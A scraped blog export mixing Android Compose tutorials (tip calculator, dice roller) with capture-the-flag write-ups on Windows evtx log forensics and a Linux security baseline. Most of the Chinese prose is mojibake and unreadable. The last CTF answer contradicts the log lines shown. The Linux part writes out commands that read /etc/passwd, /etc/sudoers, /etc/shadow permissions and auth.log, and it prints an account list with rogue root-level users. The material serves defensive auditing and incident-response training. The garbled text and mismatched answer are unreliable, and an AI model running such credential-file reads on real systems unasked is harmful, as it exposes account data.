Keyboardç›‘å¬äº‹ä»¶ï¼Œæ˜¯TextFieldçš„ä¸€ä¸ªå±æ€§ï¼ŒæŒ‡çš„æ˜¯é€‰æ‹©æ–‡æœ¬åŸŸåæ‰§è¡Œçš„é”®ç›˜äº‹ä»¶ï¼Œæ¯”å¦‚ä¸‹é¢é€‰æ‹©æ–‡æœ¬åŸŸåï¼Œä¼šå¼¹å‡ºæ•°å­—é”®ç›˜ï¼Œå¹¶ä¸”ç‚¹å‡»å³ä¸‹è§’çš„Enterï¼ˆæˆ–è€…â†ï¼‰ä¼šè·³åˆ°ä¸‹ä¸€ä¸ªæ–‡æœ¬åŸŸã€‚\nkeyboardOptions = KeyboardOptions.Default.copy(\rkeyboardType = KeyboardType.Number,\rimeAction = ImeAction.Next\r) æ¨ªå±é€‚é…ï¼Œä¹Ÿæ˜¯Modifierä¸­çš„ä¸€ä¸ªå±æ€§ï¼šverticalScrollï¼ˆå‚ç›´æ»šåŠ¨ï¼‰ï¼Œå¦‚æœä¸åŠ ä¸Šè¿™ä¸ªå±æ€§ï¼Œåœ¨æ¨ªå±çš„æƒ…å†µä¸‹Tip Amountä¼šç”±äºå±å¹•é™åˆ¶æ— æ³•æ˜¾ç¤ºï¼Œå¦‚æœåŠ ä¸Šæ»‘åŠ¨æ•ˆæœä¼šæ›´å¥½äº›ã€‚\n.... Column(modifier= modifier\r.statusBarsPadding()\r.fillMaxSize()\r.padding(horizontal = 40.dp)\r.verticalScroll(\rrememberScrollState()\r)\r.safeContentPadding(),\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) æ•´ä½“ä»£ç  #\rimport...\rclass MainActivity : ComponentActivity() {\roverride fun onCreate(savedInstanceState: Bundle?) {\rsuper.onCreate(savedInstanceState)\renableEdgeToEdge()\rsetContent {\rMyApplicationTheme {\rSurface(modifier = Modifier\r.fillMaxSize(),\rcolor = MaterialTheme.colorScheme.background) {\rTipTimeLayout()\r}\r}\r}\r}\r}\r@Composable\rfun TipTimeLayout(modifier: Modifier=Modifier)\r{\rvar roundUp by remember { mutableStateOf(false) }\rvar amountInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\rvar tipInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\rval amount = amountInput.toDoubleOrNull()?:0.0\rval percent = tipInput.toDoubleOrNull()?:0.0\rval tip = calculateTip(amount, tipPercent = percent,roundUp)\rColumn(modifier= modifier\r.statusBarsPadding()\r.fillMaxSize()\r.padding(horizontal = 40.dp)\r.verticalScroll(\rrememberScrollState()\r)\r.safeContentPadding(),\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) {\rText(text = stringResource(id = R.string.calculate_tip),\rmodifier= Modifier\r.align(Alignment.Start)\r.padding(bottom = 16.dp, top = 40.dp)\r)\rEditNumberField(value = amountInput,\ronValueChange = { amountInput = it },\rmodifier= Modifier\r.padding(bottom = 32.dp)\r.fillMaxSize(),\rid = R.string.bill_amount,\rkeyboardOptions = KeyboardOptions.Default.copy(\rkeyboardType = KeyboardType.Number,\rimeAction = ImeAction.Next\r))\rEditNumberField(value = tipInput,\ronValueChange = { tipInput = it },\rmodifier= Modifier\r.padding(bottom = 32.dp)\r.fillMaxSize(),\rid = R.string.how_was_the_service,\rkeyboardOptions = KeyboardOptions.Default.copy(\rkeyboardType = KeyboardType.Number,\rimeAction = ImeAction.Done\r),\r)\rRoundTheTipRow( roundUp = roundUp,\ronRoundUpChanged = { roundUp = it },\rmodifier = Modifier.padding(bottom = 32.dp),\r)\rText(text = stringResource(id = R.string.tip_amount,tip),\rfontSize = MaterialTheme.typography.headlineMedium.fontSize, )\rSpacer(modifier = Modifier.height(150.dp))\r}\r}\r@Composable\rfun RoundTheTipRow(roundUp: Boolean,\ronRoundUpChanged: (Boolean) -\u0026gt; Unit\r,modifier: Modifier = Modifier,\r) {\rRow(modifier= modifier\r.fillMaxSize()\r.size(48.dp),\rhorizontalArrangement = Arrangement.Center,\rverticalAlignment = Alignment.CenterVertically\r) {\rText(text = stringResource(R.string.round_up_tip),\rmodifier=Modifier.padding(bottom = 20.dp),\r)\rSwitch(\rchecked = roundUp,\ronCheckedChange = onRoundUpChanged,\rmodifier = modifier\r.fillMaxWidth()\r.wrapContentWidth(Alignment.End)\r)\r}\r}\r@Composable\rfun EditNumberField(value:String,\ronValueChange:(String)-\u0026gt;Unit,\rmodifier: Modifier = Modifier,\rid:Int,\rkeyboardOptions: KeyboardOptions,\r) {\rTextField(\rvalue = value,\ronValueChange = onValueChange,\rmodifier = modifier,\rlabel = { Text(text = stringResource(id = id))},\rkeyboardOptions = keyboardOptions\r)\r}\rprivate fun calculateTip(amount: Double, tipPercent: Double=15.0,roundUp: Boolean):String{\rvar tip = tipPercent / 100 * amount\rif (roundUp) {\rtip = kotlin.math.ceil(tip)\r}\rreturn NumberFormat.getCurrencyInstance().format(tip)\r} ","date":"2024-07-10","externalUrl":null,"permalink":"/posts/2024/07/android-state-interaction-tip-calculate/","section":"Posts","summary":"","title":"Android-çŠ¶æ€äº¤äº’-TipCalculate","type":"posts"},{"content":"\rå‰è¨€ #\ræœ€è¿‘åœ¨å­¦ä¹ Android appå¼€å‘ï¼Œç”¨çš„æ˜¯Kotlinè¯­è¨€ï¼Œç„¶è€ŒBç«™ä¸Šé¢çš„è§†é¢‘è´¨é‡å¹¶ä¸æ˜¯å¾ˆé«˜ï¼Œå¤§å¤šæ•°éƒ½æ˜¯å¯¹ç¼–ç¨‹æ— åŸºç¡€äººå‘˜çš„åŸºæœ¬è¯­æ³•æ•™å­¦ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œæˆ‘è§‰å¾—Androidå®˜æ–¹çš„Developerå¼€å‘è€…è¯¾ç¨‹æ˜¯å¾ˆä¸é”™çš„ã€‚æ­¤æ–‡ç« å°±æ˜¯æ ¹æ®Android Developerä¸­çš„åˆ›å»ºäº¤äº’å¼Dice Rollerï¼ˆæ‘‡éª°å­ï¼‰éƒ¨åˆ†è¿›è¡Œå­¦ä¹ è®°å½•ï¼Œä½¿ç”¨çš„æ˜¯Jetpack composeçš„uiå¼€å‘æ¡†æ¶ã€‚\nç¯å¢ƒ #\rAPIç‰ˆæœ¬ï¼š31ï¼ˆå®˜æ–¹ä½¿ç”¨çš„æ˜¯26ï¼Œä¸è¿‡å¹¶æ²¡æœ‰ä»€ä¹ˆå½±å“ï¼‰\nå…³é”®ç‚¹ #\rModifier #\råœ¨Jetpack Composeæ¡†æ¶ä¸­ï¼Œæ¯ä¸€ä¸ªå¯ç»„åˆå‡½æ•°éƒ½ä¼šæœ‰ä¸ªè‡ªå¸¦çš„Modifierï¼Œç”¨äºä¿®æ”¹å…¶æ ·å¼ã€‚å…·ä½“æ¥è¯´å°±ç±»ä¼¼äºhtmlä¸­çš„divå®¹å™¨ï¼Œåœ¨æ­¤æ¡†æ¶ä¸­æ¯ä¸ªå‡½æ•°éƒ½ä¼šè‡ªå¸¦ä¸€ä¸ªå®¹å™¨ï¼Œå®¹å™¨ä¹Ÿæ˜¯å¯ä»¥ç»§æ‰¿çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å­å¯¹è±¡å¯ä»¥ä½¿ç”¨çˆ¶å¯¹è±¡çš„å®¹å™¨ç‰¹å¾ã€‚\nä¾‹å¦‚åœ¨ä¸‹é¢è¿™ä¸ªä»£ç ç¤ºä¾‹ä¸­ï¼Œæ•´ä½“è§†çª—å¤§å°æ˜¯è¢«æŒ‡å®šä¸ºModifierçš„fillMaxSizeï¼Œä¹Ÿå°±æ˜¯å¡«å……åˆ°æœ€å¤§å°ºå¯¸ï¼ˆå¡«å……å…¨å±ï¼‰ã€‚ä¸ä»…å¦‚æ­¤è¿˜å¯æŒ‡å®špaddingå¡«å……ã€èƒŒæ™¯é¢œè‰²ã€ä»¥åŠå¡«å……æƒé‡ç­‰ã€‚ã€‚ã€‚\nclass MainActivity : ComponentActivity() {\roverride fun onCreate(savedInstanceState: Bundle?) {\rsuper.onCreate(savedInstanceState)\renableEdgeToEdge()\rsetContent {\rMyApplicationTheme {\rSurface(modifier = Modifier\r.fillMaxSize(),\rcolor = MaterialTheme.colorScheme.background) {\rDiceWithButtonAndImage(modifier = Modifier\r.fillMaxSize())\r}\r}\r}\r}\r} Compose #\råœ¨å‡½æ•°ä¸Šæ–¹æ·»åŠ **@Composeæ³¨è§£ï¼Œå¯ä»¥å°†å‡½æ•°å£°æ˜ä¸ºå¯ç»„åˆ**å‡½æ•°ã€‚å£°æ˜åï¼Œå°±æœ‰ç‚¹ç±»ä¼¼äºhtmlçš„ç›’å­æ¨¡å‹ï¼Œå¯ä»¥è¿›è¡Œç»„åˆåµŒå¥—ã€‚\n@Composable\rfun DiceWithButtonAndImage(modifier: Modifier) {\rColumn(modifier=modifier,\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) {\rImage(\rpainter = painterResource(R.drawable.dic1),\rcontentDescription = result.toString()\r)\rButton(onClick = {\r}) {\rText(stringResource(R.string.roll),\rmodifier=Modifier.height(16.dp))\r}\r}\r} åœ¨ä¸Šé¢è¿™æ®µä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ•´ä½“æ˜¯ä¸€ä¸ªcolumnç«–æŸ±å½¢çš„**â€œå®¹å™¨â€ï¼Œå…¶ä¸­æ”¾ç½®äº†ä¸€ä¸ªå›¾ç‰‡å’Œä¸€ä¸ªæŒ‰é’®ã€‚å¯¹äºæ’åˆ—å‡½æ•°æ¥è¯´ï¼Œå¯ä»¥æŒ‡å®šå…¶æ°´å¹³æˆ–å‚ç›´çš„Style**\nè§£å†³æ–¹æ¡ˆ #\ré€»è¾‘æ¢³ç† #\råœ¨æœªç‚¹å‡»æŒ‰é’®ä¹‹å‰ï¼Œåº”è¯¥å…ˆå±•ç¤ºä¸€å¼ éª°å­çš„å›¾ç‰‡ï¼ˆå¯ä»¥éšæœºä¹Ÿå¯ä»¥å›ºå®šï¼‰ï¼Œè¿™é‡Œå°±ç”¨å›ºå®šçš„æ–¹å¼æ¥å±•ç¤ºã€‚\né‚£ä¹ˆåœ¨Buttonç‚¹å‡»ä¹‹åï¼Œå¸Œæœ›å¾—åˆ°çš„æ•ˆæœå°±æ˜¯ï¼Œç•Œé¢ä¸Šçš„Imageè¢«æ›¿æ¢ã€‚\nä½†æ˜¯å¦‚æœç›´æ¥ä½¿ç”¨å˜é‡è¦†ç›–çš„æ–¹å¼æ˜¯æ— æ³•å®ç°çš„ï¼Œå› ä¸ºåœ¨Buttonç‚¹å‡»ä¹‹å‰é¡µé¢æ˜¯å·²ç»åŠ è½½å¥½äº†çš„ï¼Œç‚¹å‡»åå†ä¿®æ”¹Imageçš„sourceæ˜¯æ²¡æœ‰æ•ˆæœçš„ã€‚\nåŸºäºå†…å­˜ç®¡ç† #\ré»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ç»„åˆå‡½æ•°æ˜¯æ— çŠ¶æ€çš„ï¼Œè¿™æ„å‘³ç€å®ƒä»¬ä¸å­˜å‚¨å€¼ï¼Œå¹¶ä¸”å¯éšæ—¶è¢«ç³»ç»Ÿé‡ç»„ï¼Œä»è€Œå¯¼è‡´å€¼è¢«é‡ç½®ã€‚ä¸è¿‡ï¼ŒCompose æä¾›äº†ä¸€ç§é¿å…è¿™ç§æƒ…å†µçš„ä¾¿æ·æ–¹å¼ã€‚å¯ç»„åˆå‡½æ•°å¯ä»¥ä½¿ç”¨Â rememberÂ å¯ç»„åˆå‡½æ•°å°†å¯¹è±¡å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚\né‚£ä¹ˆå°†éª°å­çš„å€¼ä½¿ç”¨rememberè¿›è¡Œå†…å­˜å­˜å‚¨å°±è¡Œäº†\nä»£ç  #\rimport....\rclass MainActivity : ComponentActivity() {\roverride fun onCreate(savedInstanceState: Bundle?) {\rsuper.onCreate(savedInstanceState)\renableEdgeToEdge()\rsetContent {\rMyApplicationTheme {\rSurface(modifier = Modifier\r.fillMaxSize(),\rcolor = MaterialTheme.colorScheme.background) {\rDiceWithButtonAndImage(modifier = Modifier\r.fillMaxSize())\r}\r}\r}\r}\r}\r@Composable\rfun DiceWithButtonAndImage(modifier: Modifier) {\rColumn(modifier=modifier,\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) {\rvar result by remember { mutableStateOf(1) }\rval imageResource = when (result) {\r1 -\u0026gt; R.drawable.dice_1\r2 -\u0026gt; R.drawable.dice_2\r3 -\u0026gt; R.drawable.dice_3\r4 -\u0026gt; R.drawable.dice_4\r5 -\u0026gt; R.drawable.dice_5\relse -\u0026gt; R.drawable.dice_6\r}\rImage(\rpainter = painterResource(imageResource),\rcontentDescription = result.toString()\r)\rButton(onClick = {\rresult = (1..6).random()\rLog.i(\u0026#34;HYH\u0026#34;, result.toString())\r}) {\rText(stringResource(R.string.roll),\rmodifier=Modifier.height(16.dp))\r}\r}\r} ç•Œé¢æ•ˆæœ\n","date":"2024-07-09","externalUrl":null,"permalink":"/posts/2024/07/dice-shaker-development-in-android-compose/","section":"Posts","summary":"","title":"Android-Composeåˆæ­¥-æ‘‡éª°å­","type":"posts"},{"content":"","date":"2024-07-08","externalUrl":null,"permalink":"/categories/web-security/","section":"Categories","summary":"","title":"Web-Security","type":"categories"},{"content":"\rå…³äºevtx #\revtxæ–‡ä»¶æ˜¯å¾®è½¯é‡‡ç”¨çš„ä¸€ç§å…¨æ–°çš„æ—¥å¿—æ–‡ä»¶æ ¼å¼ã€‚åœ¨æ­¤ä¹‹å‰çš„æ ¼å¼æ˜¯Â evtÂ ã€‚evtxç”±Windowsäº‹ä»¶æŸ¥çœ‹å™¨åˆ›å»ºï¼ŒåŒ…å«Windowsè®°å½•çš„äº‹ä»¶åˆ—è¡¨ï¼Œä»¥ä¸“æœ‰çš„äºŒè¿›åˆ¶XMLæ ¼å¼ä¿å­˜ã€‚\nåœ¨æœ¬æ–‡çš„é™„ä»¶ä¸­ï¼Œå­˜åœ¨ä¸‰ä¸ªæ—¥å¿—ï¼Œåˆ†åˆ«æ˜¯å®‰å…¨ã€æ—¥å¿—ã€åº”ç”¨ç¨‹åº\nä¸è¦ç›´æ¥è¿è¡Œï¼ï¼ç”¨windowsè‡ªå¸¦çš„äº‹ä»¶æŸ¥çœ‹å™¨æ‰“å¼€\nå¼€å§‹åˆ†æ #\r#æ­¥éª¤1ï¼ˆå®‰å…¨æ—¥å¿— #\r1.å°†é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿæ‰€ä½¿ç”¨çš„IPåœ°å€\næŸ¥æ‰¾ä¸ç™»å½•ç›¸å…³çš„äº‹ä»¶IDï¼Œå¦‚ 4624 (æˆåŠŸç™»å½•)ã€4625 (ç™»å½•å¤±è´¥)ã€‚\næŸ¥çœ‹è¯¦ç»†ä¿¡æ¯å¾—åˆ°é»‘å®¢IP\n#æ­¥éª¤2ï¼ˆå®‰å…¨æ—¥å¿— #\r2.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿåä¿®æ”¹äº†ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·å\næŸ¥è¯¢äº‹ä»¶ä¸ºID 4738ï¼ˆä¿®æ”¹ç”¨æˆ·å±æ€§ï¼‰\nå¯ä»¥çœ‹åˆ°åŸæœ¬çš„administratorè¢«ä¿®æ”¹æˆäº†Administartroã€‚\né‚£ä¹ˆä¿®æ”¹åçš„ç”¨æˆ·åå°±æ˜¯Administartro\n#æ­¥éª¤ä¸‰ï¼ˆå®‰å…¨æ—¥å¿— #\r3.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»ŸåæˆåŠŸè®¿é—®äº†ä¸€ä¸ªå…³é”®ä½ç½®çš„æ–‡ä»¶\næŸ¥è¯¢äº‹ä»¶ID 4663ï¼ˆå¯¹è±¡è®¿é—®ï¼‰\nè®¿é—®æ–‡ä»¶åä¸ºSCHEMA.DATï¼Œä¼¼ä¹æ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚ã€‚ã€‚\n#æ­¥éª¤å››ï¼ˆåº”ç”¨ç¨‹åºæ—¥å¿— #\r4.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿåé‡å¯è¿‡å‡ æ¬¡æ•°æ®åº“æœåŠ¡ï¼Œæœ€åä¸€æ¬¡é‡å¯æ•°æ®åº“æœåŠ¡åæ•°æ®åº“æœåŠ¡çš„è¿›ç¨‹IDå·\nè®¾ç½®ç­›é€‰å™¨ä¸ºMySQL\néšä¾¿æŸ¥çœ‹ä¸€ä¸ªå‘ç°æœ‰startingçš„å­—ç¬¦ä¸²å­˜åœ¨\næŒ‰ç…§æ—¶é—´å€’åºï¼ŒæŸ¥æ‰¾startingå­—ç¬¦ä¸²ï¼Œåœ¨æœ€è¿‘çš„ä¸€æ®µå‘ç°IDæ˜¯1052ï¼Œä¸è¿‡è¿™å¹¶ä¸æ˜¯ç­”æ¡ˆï¼Œå› ä¸ºè¯´çš„æ˜¯é‡å¯ï¼Œé‚£ä¹ˆä¸€å®šè¦æœ‰äººä¸ºçš„normal shutdownæ—¥å¿—æ‰å¯¹\næ­£ç¡®çš„è¿›ç¨‹æ˜¯ID 8820\nä¹‹å‰çš„äººä¸ºå…³é—­\n#æ­¥éª¤äº”ï¼ˆç³»ç»Ÿæ—¥å¿— #\r5.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿåä¿®æ”¹äº†ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åå¹¶å¯¹ç³»ç»Ÿæ‰§è¡Œäº†å¤šæ¬¡é‡å¯æ“ä½œï¼Œé»‘å®¢ä½¿ç”¨ä¿®æ”¹åçš„ç”¨æˆ·é‡å¯ç³»ç»Ÿçš„æ¬¡æ•°\næŸ¥è¯¢äº‹ä»¶IDä¸º 1074 ï¼ˆç³»ç»Ÿè®¡åˆ’å¯åŠ¨ï¼‰\nè™½ç„¶æœ‰å…­æ¡æ—¥å¿—ï¼Œä½†æ˜¯ä»è¯¦ç»†ä¿¡æ¯å’Œæ—¶é—´æ¥çœ‹ï¼Œå®é™…ä¸Šæ˜¯ä¸¤ä¸¤åˆ†ç»„çš„ï¼Œé‡å¯çš„æ¬¡æ•°ä¸€å…±æœ‰ä¸‰æ¬¡\n","date":"2024-07-08","externalUrl":null,"permalink":"/posts/2024/07/windows-evtx-analysis/","section":"Posts","summary":"","title":"Windows-evtxåˆ†æ","type":"posts"},{"content":"\rå‰è¨€ #\rç¯å¢ƒæ¥è‡ªäºç„æœºedisec\né¢˜è§£ #\ræ­¥éª¤ä¸€ #\r1.æŸ¥çœ‹ç›¸åº”æ–‡ä»¶ï¼Œè´¦æˆ·xiaomingçš„å¯†ç è®¾å®šå¤šä¹…è¿‡æœŸ\nlinux chageå‘½ä»¤ç®€ä»‹ï¼šchageå‘½ä»¤ç”¨äºå¯†ç å®æ•ˆç®¡ç†ï¼Œè¯¥æ˜¯ç”¨æ¥ä¿®æ”¹å¸å·å’Œå¯†ç çš„æœ‰æ•ˆæœŸé™ã€‚\nchage -l xiaoming #æ‰§è¡Œä¼šå¾—åˆ°ä»¥ä¸‹å†…å®¹\rLast password change : \u0026lt;ä¸Šæ¬¡å¯†ç æ›´æ”¹çš„æ—¥æœŸ\u0026gt;\rPassword expires : \u0026lt;å¯†ç è¿‡æœŸæ—¥æœŸ\u0026gt;\rPassword inactive : \u0026lt;å¯†ç å¤±æ•ˆæ—¥æœŸ\u0026gt;\rAccount expires : \u0026lt;è´¦æˆ·å¤±æ•ˆæ—¥æœŸ\u0026gt;\rMinimum number of days between password change : \u0026lt;å¯†ç æ›´æ”¹çš„æœ€å°å¤©æ•°\u0026gt;\rMaximum number of days between password change : \u0026lt;å¯†ç æ›´æ”¹çš„æœ€å¤§å¤©æ•°\u0026gt;\rNumber of days of warning before password expires : \u0026lt;å¯†ç è¿‡æœŸè­¦å‘Šå¤©æ•°\u0026gt; é‚£ä¹ˆæˆ‘è¿™é‡Œå¾—åˆ°çš„ä¿¡æ¯å‘¢å°±æ˜¯\nroot@dengbap:~# chage -l xiaoming\rLast password change : password must be changed\rPassword expires : password must be changed\rPassword inactive : password must be changed\rAccount expires : never\rMinimum number of days between password change : 0\rMaximum number of days between password change : 7\rNumber of days of warning before password expires : 7 è¿™é‡Œæ²¡æœ‰ä¿®æ”¹è¿‡å¯†ç ï¼Œä¸è¿‡å¯ä»¥çœ‹å‡ºå¯†ç çš„æœ‰æ•ˆæœŸé™ä¹Ÿå°±æ˜¯7å¤©\nç­”æ¡ˆï¼šflag{7}\næ­¥éª¤äºŒ #\r2.æŸ¥çœ‹ç›¸åº”æ–‡ä»¶ï¼Œè®¾ç½®çš„å¯†ç åˆ°æœŸè§„åˆ™æ˜¯å¤šå°‘æŒ‰ç…§flag{æé†’æ—¶é—´-æœ€å¤§æ—¶é—´}è¿›è¡Œæäº¤\ncat /etc/login.defs #å¯ä»¥åœ¨Password aging controlsä¸­æŸ¥çœ‹å¹¶é…ç½®ç”¨æˆ·çš„å¯†ç è¿‡æœŸè§„åˆ™ ç­”æ¡ˆï¼šflag{7-99999}\næ­¥éª¤ä¸‰ #\r3.å·²å®‰è£…sshï¼Œè¯·æäº¤å½“å‰SSHç‰ˆæœ¬\nroot@dengbap:/www# ssh -V\rOpenSSH_8.9p1 Ubuntu-3ubuntu0.7, OpenSSL 3.0.2 15 Mar 2022 ç­”æ¡ˆï¼šflag{OpenSSH_8.9p1}\næ­¥éª¤å›› #\r4.å¯¹passwdåŠshadowæ–‡ä»¶æƒé™åˆ†é…è¿›è¡Œæƒé™å€¼æäº¤å¹¶æäº¤æ˜¯å¦åˆè§„å¦‚ï¼š644+true\nroot@dengbap:/# ls -l /etc/passwd /etc/shadow\r-rwxr-xr-x 1 root root 2304 Jun 25 16:19 /etc/passwd\r-rwxr-xr-x 1 root shadow 1770 Jul 6 20:03 /etc/shadow\r#-rwxr-xr-xç”¨æ•°å­—è¡¨ç¤ºä¸º755 è¿™ä¸¤ä¸ªæ–‡ä»¶çš„æƒé™å€¼ä¸åˆè§„\nç­”æ¡ˆï¼šflag{755+false}\næ­¥éª¤äº” #\r5.ç»“åˆç›¸å…³çŸ¥è¯†æ£€æŸ¥åœ¨ç³»ç»Ÿä¸­å­˜åœ¨å¯ç–‘ç”¨æˆ·ï¼Œè¿›è¡Œæäº¤ç”¨æˆ·å,å¤šä¸ªç”¨æˆ·åä»¥+å·è¿æ¥\næ­¤å¤„åº”æ€¥å“åº”çš„æ—¶å€™ä¹Ÿå¯ä»¥ç”¨åˆ°ï¼Œä¸»è¦æŸ¥çœ‹åœ¨ç”¨æˆ·å®¶ç›®å½•ï¼Œrootå®¶ç›®å½•ï¼Œä»¥åŠpasswdå’Œshadowæ–‡ä»¶çš„å¯ç–‘ç”¨æˆ·å’Œå­—æ®µ\ncat /etc/passwd #æŸ¥çœ‹è´¦å·ä¿¡æ¯\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\rsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\rsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\rmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\rsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\rpollinate:x:105:1::/var/cache/pollinate:/bin/false\rsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\rsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\ruuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\rtcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\rtss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\rlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\rfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\rusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\rdengbao:x:1000:1000:dengbao:/home/dengbao:/bin/bash\rlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\rxiaoming:x:1001:1001::/home/xiaoming:/bin/sh\ryunwei:x:0:1002::/home/yunwei:/bin/sh\rsecurity:x:1002:1003::/home/security:/bin/sh\rzhanglei:x:1003:1004::/home/zhanglei:/bin/sh\rwangwei:x:0:1005::/home/wangwei:/bin/sh\rzhangsan:x:1004:1006::/home/zhangsan:/bin/sh\rmysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false\rredis:x:115:121::/var/lib/redis:/usr/sbin/nologin\rwww:x:1005:1007::/home/www:/sbin/nologin\rdnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin é€ä¸ªå°è¯•ï¼Œå‘ç°åœ¨yunweiå’Œwangweiä¸¤ä¸ªç”¨æˆ·ä¸­çš„æƒé™æ˜¯rootï¼Œå±äºå¯ç–‘ç”¨æˆ·\nç­”æ¡ˆï¼šflag{yunwei+wangwei}\næ­¥éª¤å…­ #\r6.ç»“åˆç›¸å…³çŸ¥è¯†ï¼Œå¯¹æ²¡æœ‰è¿›è¡Œæƒé™åˆ†ç¦»çš„ç”¨æˆ·è¿›è¡Œæäº¤\nroot@dengbap:/# cat /etc/sudoers\r..................\r..................\r# User privilege specification\rroot ALL=(ALL:ALL) ALL\rzhangsan ALL=(ALL:ALL) ALL\r# Members of the admin group may gain root privileges\r%admin ALL=(ALL) ALL\r# Allow members of group sudo to execute any command\r%sudo ALL=(ALL:ALL) ALL\r# See sudoers(5) for more information on \u0026#34;@include\u0026#34; directives:\r@includedir /etc/sudoers.d å¯ä»¥çœ‹åˆ°User privilegeé‚£é‡Œå¤šäº†ä¸€ä¸ªzhangsan\nsudoå‘½ä»¤çš„å·¥ä½œè¿‡ç¨‹\n1ã€å½“ç”¨æˆ·æ‰§è¡Œsudoæ—¶ï¼Œç³»ç»Ÿä¼šä¸»åŠ¨å¯»æ‰¾/etc/sudoersæ–‡ä»¶ï¼Œåˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯å¦æœ‰æ‰§è¡Œsudoçš„æƒé™ï¼›\n2ã€ç¡®è®¤ç”¨æˆ·å…·æœ‰å¯æ‰§è¡Œsudoçš„æƒé™åï¼Œè®©ç”¨æˆ·è¾“å…¥ç”¨æˆ·è‡ªå·±çš„å¯†ç ç¡®è®¤ï¼›\n3ã€è‹¥å¯†ç è¾“å…¥æˆåŠŸï¼Œåˆ™å¼€å§‹æ‰§è¡Œsudoåç»­çš„å‘½ä»¤ï¼›\n4ã€rootæ‰§è¡Œsudoæ—¶ä¸éœ€è¦è¾“å…¥å¯†ç (æ–‡ä»¶ä¸­æœ‰é…ç½®root ALL=(ALL) ALLè¿™æ ·ä¸€æ¡è§„åˆ™)ï¼›\n5ã€è‹¥æ¬²åˆ‡æ¢çš„èº«ä»½ä¸æ‰§è¡Œè€…çš„èº«ä»½ç›¸åŒï¼Œä¹Ÿä¸éœ€è¦è¾“å…¥å¯†ç ã€‚\nå‚è€ƒæ–‡ç« ï¼šubuntuç»™ç”¨æˆ·èµ‹äºˆrootæƒé™,å¹¶ä¸”å…å¯†sudo su_root all=(all:all) all-CSDNåšå®¢\nç­”æ¡ˆï¼šflag{zhangsan}\næ­¥éª¤ä¸ƒ #\r7.ç»“åˆç›¸å…³çŸ¥è¯†ï¼Œæäº¤å®¡è®¡æ—¥å¿—åŠŸèƒ½çŠ¶æ€\nå¯¹æ—¥å¿—å¼€å¯çŠ¶æ€è¿›è¡Œæäº¤ï¼šsystemctl statusÂ syslog\nç­”æ¡ˆï¼šflag{active}\næ­¥éª¤å…«\n8.å®¡è®¡ç›¸å…³æ—¥å¿—ï¼ŒæŸ¥çœ‹zhangsanç”¨æˆ·å°è¯•ä½¿ç”¨sudoä½†ç™»å½•å¤±è´¥çš„æ—¥å¿—ï¼Œæäº¤å…¶æ—¶é—´ï¼Œå¦‚flag{Jun 23 00:39:52}\næ—¥å¿—æ–‡ä»¶çš„ä½ç½®æ˜¯ /var/log/auth.log\nroot@dengbap:~# cat /var/log/auth.log |grep \u0026#34;zhangsan\u0026#34;\rJul 6 20:24:24 dengbap su: (to zhangsan) root on pts/0\rJul 6 20:24:24 dengbap su: pam_unix(su:session): session opened for user zhangsan(uid=1004) by root(uid=0)\rJul 6 20:24:29 dengbap su: pam_unix(su:session): session closed for user zhangsan ç­”æ¡ˆï¼šflag{Jun 23 01:38:20} 